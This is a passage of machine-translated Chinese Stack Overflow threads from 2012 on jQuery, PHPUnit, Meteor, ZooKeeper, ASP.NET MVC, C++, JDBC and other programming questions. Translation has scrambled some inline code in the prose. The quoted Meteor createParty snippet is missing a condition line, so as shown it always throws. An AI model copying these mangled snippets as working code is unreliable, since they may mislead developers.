        var value = $(this).val();
        if (value == 'cheshire' || value == 'city of london' || value == 'durham') {
            window.location.href = 'http://www.google.com/';
        }
    })
}); 
```

**编辑：**此外，您需要向选项元素添加值：`<option value="cheshire">Cheshire</option>`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T17:10:06.530

我希望这会有所帮助（如果您需要 javascript/jquery 解决方案），

```
$('#selectbox_ID').change( function() {
     if($(this).val() == "your country"){

     }
}); 
```

# uml - 如何从 IBM Rational Rhapsody 图表中导出图像

> ID：10338069
> 
> 赞同：2
> 
> 时间：2012-04-26T17:05:03.607
> 
> 标签：uml, rhapsody

我使用 IBM Rational Rhapsody 7.6 进行 UML 建模。我创建了类图、用例、序列图，我想将其导出为某种图像或 PDF 或其他东西，任何可以以很好的方式查看的东西都可以。

我在“工具”下找到了要报告的导出，但随后您会得到一个格式非常奇怪的富文本文件，并且类图将在中间被剪切以适合 A4 页面。

那么如何从IBM Rational Rhapsody 导出到图像，UML 建模。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T21:27:12.787

如果您只想导出单个图表，请右键单击图表并选择“导出图表图像”，然后就可以了。
如果您想拥有一个同时导出多个图表的模型，您可以尝试通过 Reporter Plus（Rhapsody 中内置）输出 HTML，或者您可以尝试 Rational Publishing Engine（可能需要额外的许可证）以获得更多功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-11T10:11:09.050

您可以通过安装诸如 CutePDF ( [http://www.cutepdf.com/Products/CutePDF/writer.asp](http://www.cutepdf.com/Products/CutePDF/writer.asp) )之类的 PDF 编写器将图表导出为 PDF

然后从 Rhapsody 的菜单中选择 File\Print Diagrams 并将所选图表打印为 PDF

# php - Clover PHPUnit 覆盖率报告包括对不需要的文件的覆盖率

> ID：10338071
> 
> 赞同：3
> 
> 时间：2012-04-26T17:05:06.617
> 
> 标签：php, phpunit, jenkins, code-coverage, clover

我刚刚在我的 Jenkins 工作中设置了 CloverPHP。

我正在使用 PHPUnit 生成三叶草报告，除了显示文件的覆盖率报告之外，它似乎都在工作

```
/usr/share/php/SymfonyComponents/YAML/sfYamlInline.php 
```

作为报告的一部分。我不确定这是从哪里来的，我的猜测是 PHPUnit 或 XDebug 包含它。显然这不是我自己的代码库的一部分，所以我对它不感兴趣。它正在影响我的项目产生的整体指标。有没有办法从报告中排除这个文件？

非常感谢， **ns**

**编辑**

答案是使用可以包含过滤器黑名单的 phpunit xml 配置文件。我将在 6 小时内正确回答我的问题（stackoverflow 让我等待 8 小时才能回答我的问题！）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-27T07:59:38.863

经过一番谷歌搜索后，我发现答案是为 phpunit 创建一个配置文件，您可以在其中从代码覆盖率报告中排除特定文件或目录。

“<filter>元素及其子元素可用于配置代码覆盖率报告的黑名单和白名单。”

```
<filter>
  <blacklist>
    <directory suffix=".php">/path/to/files</directory>
    <file>/path/to/file</file>
    <exclude>
      <directory suffix=".php">/path/to/files</directory>
      <file>/path/to/file</file>
    </exclude>
      </blacklist>
  <whitelist addUncoveredFilesFromWhitelist="true">
    <directory suffix=".php">/path/to/files</directory>
    <file>/path/to/file</file>
    <exclude>
      <directory suffix=".php">/path/to/files</directory>
      <file>/path/to/file</file>
    </exclude>
  </whitelist>
</filter> 
```

然后使用标志调用 PHPUnit：

```
phpunit -c config.xml 
```

可以在此处找到有关配置文件的更多信息：

[http://www.phpunit.de/manual/current/en/appendixes.configuration.html](http://www.phpunit.de/manual/current/en/appendixes.configuration.html)

# javascript - 流星排行榜应用

> ID：10338072
> 
> 赞同：0
> 
> 时间：2012-04-26T17:05:09.123
> 
> 标签：javascript, meteor, leaderboard

我是一个试图学习和喜欢排行榜应用程序的新手。我如何找到资源来学习如何提出建议：

* * *

制作一个在按分数排序和按名称排序之间切换的按钮。提示：使用 Session 变量来保存当前的排序选择。

制作一个按钮，将每个人的分数重置为随机数。（在服务器启动代码中已经有代码可以做到这一点。你能把其中的一些代码分解出来，让它在客户端和服务器上运行吗？）

## 实施一种在排行榜中添加和删除科学家的方法。

我很想学习如何做这些事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T20:45:30.023

流星是非常新的。不幸的是，在线信息并不丰富，教程也很少。您最好的信息和学习来源是文档。

**流星文档：** [http ://docs.meteor.com/](http://docs.meteor.com/)

**教程：** [http ://www.skalb.com/2012/04/16/creating-a-document-sharing-site-with-meteor-js/](http://www.skalb.com/2012/04/16/creating-a-document-sharing-site-with-meteor-js/)

**关于如何聊天的视频：http:** [//vimeo.com/40300075](http://vimeo.com/40300075)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T01:05:03.383

我已经在我的 Leaderboard 移植到 CoffeeScript + Less + Bootstrap 中实现了排序以及其他一些增强功能。

**博客**：[https ://srackham.wordpress.com/2012/04/22/meteor-leaderboard-with-coffeescript-less-and-bootstrap/](https://srackham.wordpress.com/2012/04/22/meteor-leaderboard-with-coffeescript-less-and-bootstrap/)

**代码**：[https ://github.com/srackham/leaderboard-coffeescript](https://github.com/srackham/leaderboard-coffeescript)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-19T14:05:24.497

我找到了这个网站。我认为这里解释得很好。

[流星教程为新手](http://www.danneu.com/posts/6-meteor-tutorial-for-fellow-noobs-adding-features-to-the-leaderboard-demo/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T08:44:56.130

我使用了最新的[演示](http://meteor.com/examples/parties)，其中包含您正在寻找的代码。查看用户如何创建派对。例子非常好。

您可以拉取应用程序，并通过运行查看代码：

```
meteor create --example parties 
```

特别关注model.js文件：

```
 createParty: function (options) {
    options = options || {};
      throw new Meteor.Error(400, "Required parameter missing");
    if (options.title.length > 100)
      throw new Meteor.Error(413, "Title too long");
    if (options.description.length > 1000)
      throw new Meteor.Error(413, "Description too long");
    if (! this.userId)
      throw new Meteor.Error(403, "You must be logged in");

    return Parties.insert({
      owner: this.userId,
      title: options.title,
      description: options.description,
    }); 
```

您需要一个好的 IDE 来跟踪每个方法的调用方式。我使用[Sublime Text2](http://www.sublimetext.com/2)搜索“createParty”等实例。您可以将应用程序分开；尝试看看您是否可以在聚会应用程序中添加其他字段来测试您的知识。自带啤酒复选框？

重点阅读[Meteor Docs](http://docs.meteor.com/)中的[Meteor.methods](http://docs.meteor.com/#meteor_methods)、[Meteor.publish](http://docs.meteor.com/#meteor_publish)、[Meteor.subscribe](http://docs.meteor.com/#meteor_subscribe)。模板事件也确实帮助了我。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-05-17T21:55:37.653

我是 Meteor 的新手，但通过执行以下操作来实现此功能：

***在 HTML 中

```
<template name="leaderboard">
  <div class="sort">
    <input type="button" class="sortByName" value="name" />
    <input type="button" class="sortByScore" value="score" />
  </div>
  <div class="leaderboard">
    {{#each players}}
      {{> player}}
    {{/each}}
  </div>
... 
```

***在 leaderboard.js 文件中

```
Template.leaderboard.players = function () {
  //if sortByName === true
  if (Session.get("sortByName")) {
    return Players.find({}, {sort: {name: 1, score: -1}});    
  } else {
  // if score
    return Players.find({}, {sort: {score: -1, name: 1}});
  }
};

Template.leaderboard.events({
  'click input.inc': function () {
    Players.update(Session.get("selected_player"), {$inc: {score: 5}});
  },
  // if name button is clicked
  'click input.sortByName': function () {
    Session.set("sortByName", true);
  },
  // if score button is clicked
  'click input.sortByScore': function () {
    Session.set("sortByName", false);
  }
}); 
```

# linux - “-;”是什么意思 意思是在 bash 语句的末尾？

> ID：10338073
> 
> 赞同：2
> 
> 时间：2012-04-26T17:05:21.420
> 
> 标签：linux, bash, syntax, pipe

例如

```
bwa sampe ref.fa r1.sai r2.sai r1.fq r2.fq | samtools view -bSho out.bam -; 
```

“-;”的目的是什么？最后的字符？他们在做什么？为什么它们是必要的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:09:20.100

分号结束命令（我相信结束*管道*在技术上是正确的说法）。如果你愿意，你可以用另一个命令跟随它，如

```
bwa sampe ref.fa r1.sai r2.sai r1.fq r2.fq | samtools view -bSho out.bam -; echo Here is another command. 
```

否则，分号是无害的，但可能是不必要的。

关于`-`分号之前的连字符、for`samtools`和许多其他命令，这意味着使用标准输入代替输入文件（或者，在某些情况下，使用标准输出代替输出文件）。这是典型的 Linux/Unix 用法。

（感谢@phatfingers 验证`samtools`命令的用法。）

# java - Zookeeper PERSISTENT_SEQUENTIAL 递增 2

> ID：10338076
> 
> 赞同：5
> 
> 时间：2012-04-26T17:05:28.967
> 
> 标签：java, apache-zookeeper

在 ZooKeeper 中执行一个简单的 create() 方法调用似乎是增加了 2 而不是正常的。虽然这实际上与[JavaDoc](http://zookeeper.apache.org/doc/r3.3.3/api/org/apache/zookeeper/CreateMode.html#PERSISTENT_SEQUENTIAL)保持一致，它只指定序列“单调递增”而不参考增量，但我不确定为什么会开始发生这种情况。

```
zk.create(path, value, Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT_SEQUENTIAL); 
```

我最终得到“key-v-0000000056”，然后是“key-v-0000000058”……57去哪儿了？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-27T09:10:29.047

创建或删除*任何子*znode 都会增加父 znode 的 cversion。由于在您似乎正在使用的 ZooKeeper 3.3.3 中，用于顺序 znode 创建的计数器是 cversion 本身，因此两个顺序创建之间的任何“虚假”创建/删除都是您遇到的行为的最可能原因。

请记住，在 ZooKeeper 3.4.x 中，删除不再影响父序列计数器：a`DataNode`内部包含 a `PersistedStat`，其中 cversion 准确表示创建的数量；相反，`Stat`您通过查询节点获得的 cversion 仍然表示子项更改的数量：`Stat.cversion = 2*PersistedStat.cversion - Stat.numChildren`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-27T04:55:56.730

您是否在创建下一个密钥之前删除了 key-v-0000000056？顺序 id 只是父节点的 cversion，在父节点上删除/创建子节点会增加 cversion。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-17T02:21:36.497

在官方文件中，它说：

> 如果设置了 ZOO_SEQUENCE 标志，则将唯一的单调递增序列号附加到路径名。”

这保证了数字是递增的，但不一定是连续的。

# c# - 根据起始字母迭代列表

> ID：10338077
> 
> 赞同：0
> 
> 时间：2012-04-26T17:05:37.967
> 
> 标签：c#, asp.net-mvc, list, c#-4.0, razor

假设我有一个包含项目的列表

-17" 屏幕
- 100GB 高清
-10788 火线- 锁
线
-显示器 - 鼠标 - 键盘 - USB

我想迭代从 A 到 c、D 到 F 等项目的列表...

```
I want this to run for items starting from A to items starting C
   @foreach (var item in Model.Items.OrderBy(i => i.Title))
            {
// Code
}

I want this to run for items starting from D to items starting F
   @foreach (var item in Model.Items.OrderBy(i => i.Title))
         {
// Code
} 
```

任何帮助？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T18:17:11.003

我将首先定义一个视图模型（一如既往）：

```
public class MyViewModel
{
    public string LetterRange { get; set; }
    public string[] Titles { get; set; }
} 
```

然后是一个控制器动作，它将转换从某处获取模型，然后将其映射到视图模型。

备注：在这个例子中，我会将模型和视图模型之间的映射代码放在控制器动作中，但通常这应该放在单独的映射层中。例如，如果您使用[AutoMapper](http://automapper.org/)，那可能是个好地方。

所以：

```
public ActionResult Index()
{
    // The model could be of any form and come from anywhere but
    // the important thing is that at the end of the day you will have
    // a list of titles here
    var model = new[] 
    { 
        "17\" Screen", 
        "100GB HD", 
        "10788 Firewire", 
        "Lock Cable", 
        "Monitor",
        "Mouse", 
        "Keyboard",
        "USB" 
    };

    // Now let's map this domain model into a view model 
    // that will be adapted to the requirements of our view.
    // And the requirements of this view is to group the titles
    // in ranges of 3 letters of the alphabet
    var viewModel = Enumerable
        .Range(65, 26)
        .Select((letter, index) => new 
        { 
            Letter = ((char)letter).ToString(), 
            Index = index 
        })
        .GroupBy(g => g.Index / 3)
        .Select(g => g.Select(x => x.Letter).ToArray())
        .Select(range => new MyViewModel
        {
            LetterRange = string.Format("{0}-{1}", range.First(), range.Last()),
            Titles = model
                .Where(item => item.Length > 0 && range.Contains(item.Substring(0, 1)))
                .ToArray()
        })
        .ToArray();

    // Let's add those titles that weren't starting with an alphabet letter
    var other = new MyViewModel
    {
        LetterRange = "Other",
        Titles = model.Where(item => !viewModel.Any(x => x.Titles.Contains(item))).ToArray()
    };

    // and merge them into the final view model
    viewModel = new[] { other }.Concat(viewModel).ToArray();

    return View(viewModel);
} 
```

现在在相应视图中剩下的就是根据要求显示标题：

```
@model MyViewModel[]

@foreach (var item in Model)
{
    <h2>@item.LetterRange</h2>
    foreach (var title in item.Titles)
    {
        <div>@title</div>
    }
} 
```

结果：

![在此处输入图像描述](../Images/831b3a364da00465fc2c571270e0445c.png)

* * *

在将映射逻辑重构为映射层之后，相应的控制器操作可能如下所示：

```
public ActionResult Index()
{
    // The model could be of any form and come from anywhere but
    // the important thing is that at the end of the day you will have
    // a list of titles here
    DomainModel[] items = ...

    // Now let's map this domain model into a view model 
    // that will be adapted to the requirements of our view.
    var viewModel = Mapper.Map<IEnumerable<DomainModel>, IEnumerable<MyViewModel>>(items);

    return View(viewModel);
} 
```

清洁和干燥。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:20:05.930

为什么不：

```
var fromAtoC = Model.Items.Where(x => x.Title != null && x.Title[0] >= 'A' && x.Title[0] <= 'C');

foreach(Model.Items m in fromAtoC)
{
       //Do some stuff
}

var fromDtoF = Model.Items.Where(x => x.Title != null && x.Title[0] >= 'D' && x.Title[0] <= 'F');

for(Model.Items m in fromDtoF)
{
       //Do some stuff
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T17:15:48.070

不确定这是最优雅的解决方案，但它会起作用。我看看我能不能想出更好的东西...

```
var itemsAtoC = Model.Items.Where.Where(i => i.StartsWith("A") || i.StartsWith("B") || i.StartsWith("C"));

foreach(var item in itemsAtoC)

{
    Console.Write(item);
} 
```

Ugggh 这也不是真正处理数字......

仍然在想...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T17:13:54.140

尝试这个：

```
Model.Items.Sort((x, y)=> x.Title.CompareTo(y.Title));
foreach (var item in Model.Items.Where(x => x.Title[0] >= 'A' && x.Title[0] <= 'C')
{
  //code
} 
```

# objective-c - 如何在通过 Core Data 保存我的 RestKit 托管对象之前对其进行修改？

> ID：10338086
> 
> 赞同：1
> 
> 时间：2012-04-26T17:06:04.073
> 
> 标签：objective-c, ios, cocoa-touch, core-data, restkit

我用 Core Data 托管对象支持很好地设置了 RestKit，但我有一些字段不存在于服务器上，仅存在于本地模型类中。

如何在对象被持久化之前设置这些字段。有没有我可以实现的“willSave”委托方法？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:35:12.223

我不太明白你想要完成什么，但你可以`willSave`在 NSManagedObject 中覆盖。文档很好地解释了它的作用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T18:42:51.773

如果你想在保存之前修改传入的数据，你应该考虑[willMapData](http://restkit.org/api/0.10.0/Protocols/RKObjectLoaderDelegate.html#//api/name/objectLoader%3awillMapData%3a)

# c++ - C++ 指向数组和 for 循环的指针；

> ID：10338091
> 
> 赞同：0
> 
> 时间：2012-04-26T17:06:15.347
> 
> 标签：c++, arrays, pointers

我对 C++ 很陌生，并且对那段代码有一点问题。我想在应该使用动态内存分配创建的数组的每个单元格中放入 1。我相信几个月前我用 malloc 在 c 中做了类似的事情。当我打印出结果（g++ Linux）时，它显示只有第一列（当我们将数组的每第十个单元格视为新列的开头时）填充了一个。其他的则作为记忆地址打印。

```
#include "stdafx.h"
#include <iostream>

class TestOfForVector {
public:
double* tabX;
double* tabY;
int n;
TestOfForVector(int getN){
    n = getN;
    tabY = new double[n*n];
    //tabX = new double[n];
    for(int i = 0; i < n; i ++ ){
        for(int j = 0; j <n; j++){
        tabY[j+i*n] = 1.0;
        std::cout<<tabY[j+i*n]<<std::endl;
        }
    }
}

~TestOfForVector(){
    delete [] tabX;
    delete [] tabY;
}
};

int main(int argc, _TCHAR* argv[])
{   
TestOfForVector newboy(10); //it will be defined by user input;
return 0;
} 
```

对不起，可能是微不足道的问题，但我在互联网上找不到答案。最好的问候，卢卡斯！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:10:52.917

`delete[] tabX`您的代码是正确的，并且（在您注释掉创建代码后注释掉您的代码之后）它运行并在我的机器上生成一列。

我不知道`stdafx.h`标题应该是什么 - 的正常签名`main`是`(int argc, char** argv)`. 所以我在编译之前删除了那个头文件`g++`。你说你在 Linux 上，所以使用 Visual Studio 看起来很奇怪，不是吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T18:09:49.370

您在析构函数中遇到了未定义的行为：

```
delete [] tabX; 
```

因为指针`tabX`悬空，因为它没有初始化。

除此之外，您的代码很好，虽然`stdafx.h`是在 Win 下使用的预编译头文件，并且`_TCHAR`是为宽字符定义的 MSVS，并且您说您正在 Linux 下编译。

# multithreading - 多线程与创建子进程

> ID：10338095
> 
> 赞同：0
> 
> 时间：2012-04-26T17:06:34.567
> 
> 标签：multithreading, fork, child-process

浏览器如何处理新标签的创建。它是分叉还是创建一个新线程？你能指出我如何在创建新线程和子进程之间进行选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:29:15.793

如今，一些现代浏览器为新选项卡创建了单独的进程。原因是如果某些站点（选项卡）包含恶意代码并且例如被冻结，则仍然可以看到其余浏览的站点。

如果您使用例如 Chrome 并且您将在 Windows 上，您可以尝试杀死一些 chrome.exe 进程，您会看到只有一个选项卡会死掉。但是，对于 chrome，它并不完全是 1 对 1（制表符到进程）。有些进程对于按原样运行浏览器至关重要（如果你杀死它们，整个浏览器都会死掉），所以如果你要尝试的话，请注意这一点。:)

请注意，几乎所有浏览器现在都有单独的插件进程（例如使用 Netscape API 编写的第三方插件）。原因与标签相同（并且更容易理解）。

要找到第二个问题的答案，请在此处查看示例：http: [//jayant7k.blogspot.com/2010/01/for.html](http://jayant7k.blogspot.com/2010/01/for.html)

# ios - 如何使用 ipad 的弹出框控制器使 UIImagePicker 全屏

> ID：10338096
> 
> 赞同：0
> 
> 时间：2012-04-26T17:06:38.547
> 
> 标签：ios, ipad, uiimagepickercontroller

我看过关于这个主题的其他帖子，但没有有效的解决方案。这当然是可能的！我在这里找到了一种解决方案，建议从容器视图控制器中呈现它。我在下面的方法中对此代码进行了注释。这确实创建了全屏视图，但是取消/拍照按钮将不起作用，我似乎无法正确关闭它。真的没有简单优雅的解决方案吗？？？？请帮忙！这是我的代码：

```
-(IBAction)launchCamera:(id)sender
{
    [self.popoverController dismissPopoverAnimated:YES];
    if ([UIImagePickerController isSourceTypeAvailable:UIImagePickerControllerSourceTypeCamera])
    {
        //fullScreenViewController = [[UIViewController alloc] init];
        //fullScreenViewController.contentSizeForViewInPopover = CGSizeMake(768, 1024);

        UIImagePickerController *imagePicker = [[UIImagePickerController alloc] init];

        //  Tried making the view full screen (or at least larger), but doesn't work...
        //popoverController.contentViewController.contentSizeForViewInPopover = CGSizeMake(384, 512);

        [imagePicker setTitle:@"camera"];
        imagePicker.sourceType = UIImagePickerControllerSourceTypeCamera;
        imagePicker.mediaTypes = [NSArray arrayWithObject:(NSString *)kUTTypeImage];
        imagePicker.delegate = self;
        imagePicker.allowsEditing = NO;

        //[fullScreenViewController.view addSubview:imagePicker.view];
        // change imagePicker to fullScreenViewController here for full screen:
        popoverController = [[UIPopoverController alloc] initWithContentViewController:imagePicker];
        [popoverController setDelegate:self];
        [popoverController presentPopoverFromBarButtonItem:sender permittedArrowDirections:UIPopoverArrowDirectionAny animated:YES];
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-07T12:31:23.380

我永远无法让 UIImagePicker 在全屏下正常工作，所以我最终使用 AVFoundation 框架来实现我自己的。

# php - PHP：如何实现服务器脚本的异步效果

> ID：10338101
> 
> 赞同：0
> 
> 时间：2012-04-26T17:07:02.910
> 
> 标签：php, asynchronous

我搜索了互联网，看到人们正在努力使用 PHP 进行并发调用，即使 PHP 没有丰富的并发功能。我最近想改进我在服务器端的一个脚本，它接受来自客户端的请求，从数据库中获取一些数据，返回数据并进行一些其他数据更新。

现在的问题是客户端必须等待服务器获取数据，完成更新和其他所有操作，然后才能最终得到它所要求的结果。然而，客户端并不关心服务器所做的数据更新，因此不应该浪费时间等待它。

通过我的研究，所有其他人都在谈论客户端在不等待结果的情况下对服务器进行异步调用，但我希望服务器在其处理过程中将数据返回给调用客户端。

如果我不想在客户端更改任何内容，是否有任何解决方法可以达到此效果？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:12:09.213

一些伪多线程怎么样？[http://phplens.com/phpeverywhere/?q=node/view/254](http://phplens.com/phpeverywhere/?q=node/view/254)

# r - R - 将观察分配到类中（sturges 规则）

> ID：10338103
> 
> 赞同：0
> 
> 时间：2012-04-26T17:07:07.707
> 
> 标签：r

我有一个包含 70 个观察值（数量）的列表，我想将它们分配给类（间隔）并执行一些基本计算（相对频率、累积频率等）。

第一个问题是，是否有 Sturges 规则的函数（即返回类的数量和长度）？

第二个问题是，R 中是否有类似于 Excel 的函数频率的函数（基于类边界计算每个类的观察值）？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:28:59.297

Sturges 规则是函数使用的默认拆分，执行此拆分的`hist`函数是：

```
?nclass.Sturges 
```

R 中有各种分组函数。我怀疑其中之一`cut`，`table`或者`xtabs`可能是你想要的。（我不明白“基于类边界计算每个类的观察值”是什么意思。）`cut`给出一个相同长度的向量，而另外两个计算计数，返回一个列联表。

# sql - 将 COUNT() sql 查询的结果保存到 powershell 中的变量中

> ID：10338105
> 
> 赞同：2
> 
> 时间：2012-04-26T17:07:17.053
> 
> 标签：sql, variables, powershell, count, sqlcmd

我正在运行一个 sql 查询，它将结果保存到 csv 中。csv 中唯一的内容是返回 COUNT() 函数。有没有办法可以将此数字直接保存到powershell中的变量中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:15:20.183

应该很简单。假设调用了 CSV 字段`Result`：

```
$result = (Import-Csv .\sqlout.csv).Result 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:33:52.677

如果你想摆脱 CSV，你可以使用 SqlServerCmdletSnapin：

```
Add-PSSnapIn SqlServerCmdletSnapin100
(Invoke-Sqlcmd -server .\sqlexpress -database foo -query 'SELECT COUNT(...) FROM ...')[0] 
```

# uiviewcontroller - 在另一个 viewController 中访问地图

> ID：10338107
> 
> 赞同：0
> 
> 时间：2012-04-26T17:07:23.463
> 
> 标签：uiviewcontroller, uitabbarcontroller, mkmapview, uitabbar

我有一个应用程序在我的应用程序加载 VC1 加载（ViewController 编号 1）时使用 UITabBar，但我在这个精确的视图控制器中有一个按钮，它需要 VC2 中的地图，但如果用户从未单击 tabBar VC2 上的第二个按钮是从未加载，因此地图甚至不存在！我尝试使用 [(VC2 *) [self.tabBarController.viewControllers objectAtIndex:1] viewDidLoad] 但之后 VC2.mapView 仍然为零。任何想法在那种情况下我怎样才能到达那个地图视图？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:09:03.087

假设控制器数组引用是正确的，您应该能够使用 VC1 中的代码强制加载视图，例如：

```
UIView *vc2MainView = [[self.tabBarController.viewControllers objectAtIndex:1] view]; 
```

此时应该初始化 VC2 的视图和子视图，并且您的引用应该是有效的。

# java - JDBC-接口的实现

> ID：10338115
> 
> 赞同：0
> 
> 时间：2012-04-26T17:08:08.847
> 
> 标签：java, jdbc

在 JDBC 中，我们主要使用 Connection、Statement 和 ResultSet 这三个接口来连接和执行 DB 中的语句。但是它们对应的对象稍后用于运行 createStatement()、executeQuery()、next() 等方法。哪个类实现了这些方法？为什么它被称为连接对象而不是实现的类对象？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:13:46.893

你实际上并没有这样做

```
Connection conn = new Connection(); 
```

你做类似的事情

```
Connection conn = DriverManager.getConnection(
     DB_PATH + "?user=" + USER_NAME + "&password=" + USER_PASS); 
Statement statement = conn.createStatement();
ResultSet resultSet = statement.executeQuery(query); 
```

但是要直接回答您的问题不，您不能实例化`Interface`您必须使用或使用代理`implements`的类。`Interface`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T17:25:04.043

在 JDBC 中，您首先通过调用注册驱动程序

```
Class.forName('classname') 
```

它加载数据库类并注册该类`DriverManager`

当你说`DriverManager.getConnection(`) - 它返回你`java.sql.Connection`（根据规范的合同）

> 哪个类实现了这些方法？

实际实现由数据库供应商提供，例如 Oracle、MySQL。

> 为什么它被称为连接对象而不是实现的类对象？

因为您[编码到接口而不是实现](http://en.wikipedia.org/wiki/Design_Patterns)（良好的编码实践）。

如果你愿意，你可以在供应商 jar 中查找并找到哪个类实现 Connection 然后而不是

```
Connection connection = DriverManager.getConnection() 
```

你可以写

```
VendorConnectionImpl vendorConnection = (VendorConnectionImpl)DriverManager.getConnection() 
```

上面的方法会起作用，但它会绑定你与那个特定的实现。

如果你想从 vendor1 移动到 vendor2，你不能这样做，首先你必须根据 vendor2 API 更改上面的代码，但是如果你使用第一种方法，你可以从 Vendor 移动到 Vendor，而无需更改代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T17:09:45.940

您不能实例化接口类。您要么自己实现该接口，要么使用[Proxy](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/reflect/Proxy.html)创建所述接口的实例，该实例将所有调用委托给提供的[InvocationHandler](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/reflect/InvocationHandler.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T17:23:35.350

这些人正在回答你的问题，但我认为你没有从评论中得到它。

您需要通过创建自己的类来实际实现接口。因此，创建一个实现接口的类，包含正确的抽象方法，然后将您想要的任何内容添加到新类中的功能中。然后，您将实例化该类以使用这些函数。

接口就像一个编程“合同”，它的存在是为了确保使用的任何扩展接口的类都满足某些功能，但是，你不能实例化接口本身来使用它的方法，你可以在你的方法中继承/覆盖它们新班级。在您覆盖新类中的抽象方法后，您可以编写任何您希望特定接口扩展类执行的其他操作。

[http://www.javabeginner.com/learn-java/java-abstract-class-and-interface](http://www.javabeginner.com/learn-java/java-abstract-class-and-interface) 和 [http://www.javaworld.com/javaworld/javaqa/2001-04/03-qa-0420-abstract。 html](http://www.javaworld.com/javaworld/javaqa/2001-04/03-qa-0420-abstract.html) 将让您阅读这些主题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-07-15T15:26:27.320

希望下面的解释会有所帮助。

Q：驱动**Connection实现**从何而来？以及Statement和ResultSet的实现？

```
Class.forName("com.mysql.jdbc.Driver").newInstance();
// String url="jdbc:mysql://localhost:3306/mydb?user=root&password=root";
Connection con = DriverManager.getConnection(url); 
```

小提示：一旦 DriverManager 类被加载（初始化），驱动程序实现就会被加载。

以mysql-connector-java:5.1.36的源码为例。

● **com.mysql.jdbc.Driver类扩展了****NonRegisteringDriver**类，其中有一个名为**connect()**的方法，它返回一个 Connection 实例。
注意NonRegisteringDriver的**registeredDrivers字段**

```
public class Driver extends NonRegisteringDriver implements java.sql.Driver {
...
public java.sql.Connection connect(String url, Properties info) throws SQLException { 
```

● mysql驱动被注册，驱动被添加到**registeredDrivers**：

```
Class.forName("com.mysql.jdbc.Driver");
...
java.sql.DriverManager.registerDriver(new Driver()); // from com.mysql.jdbc.Driver
...
registeredDrivers.addIfAbsent(new DriverInfo(driver, da));  // mysql driver instance is added to registeredDrivers 
```

从现在开始，**JDBC**就知道有一种 JDBC 实现，即 mysql。
● 然后创建连接：

```
Connection con = DriverManager.getConnection(url); 
```

**● 关注DriverManager.getConnection**的源码
注意**注册**
的Drivers 这里的**connection实现**是由**aDriver.driver.connect创建的**

```
for(DriverInfo aDriver : registeredDrivers) {
...
     Connection con = aDriver.driver.connect(url, info);
...
} 
```

● 由于已经找到了mysql的connection实现，所以通过挖掘mysql-connector-java:5.1.36的源码也可以找到**Statement**和**ResultSet的实现**

```
Statement stmt = con.createStatement();
// String sql = "select * from user";
ResultSet rs=stmt.executeQuery(sql); 
```

至于**JDBC 4**，在加载 DriverManager 类时，会自动从类路径中检测驱动程序实现：
[DriverManager.java#l101](http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/tip/src/share/classes/java/sql/DriverManager.java#l101)

```
static {
    loadInitialDrivers();
    println("JDBC DriverManager initialized");
}

...

private static void loadInitialDrivers() {
...
    ServiceLoader<Driver> loadedDrivers = ServiceLoader.load(Driver.class);
...
} 
```

文件 mysql-connector-java-5.1.36.jar!/ **META-INF/services/java.sql.Driver 的**内容：

```
com.mysql.jdbc.Driver
com.mysql.fabric.jdbc.FabricMySQLDriver 
```

# php - 从生成的内容中删除链接标签和内部 html

> ID：10338118
> 
> 赞同：1
> 
> 时间：2012-04-26T17:08:17.160
> 
> 标签：php

**我在 php使用以下代码**调用的模板文件中有一段文本 ：

 **```
echo $playlist->description 
```

该字段包含 html 链接，当该字段的结果显示为使用 twitter api 创建的推文框中的内容时，我想删除这些链接。

**显示文本示例：**

```
<a href="http://google.com">http://google.com</a> some text here. 
```

**我希望达到以下结果：**

```
some text here 
```

`preg_replace`我已经研究过使用正则表达式、和其他一些来完成此操作。但是，我还没有弄清楚如何合并到我现有的字符串中。

**我试过以下没有成功，**

```
echo $playlist->description->$str = preg_replace('#(<a.*?>).*?(</a>)#', '$1$2', $str) 
```

我是一个自称 php 菜鸟，我已经花了几个星期来尝试实现我的目标，所以非常感谢任何帮助。我觉得我真的很亲近！帮助！！！:)

最好的问候，迈克

* * *

## 回答 #1

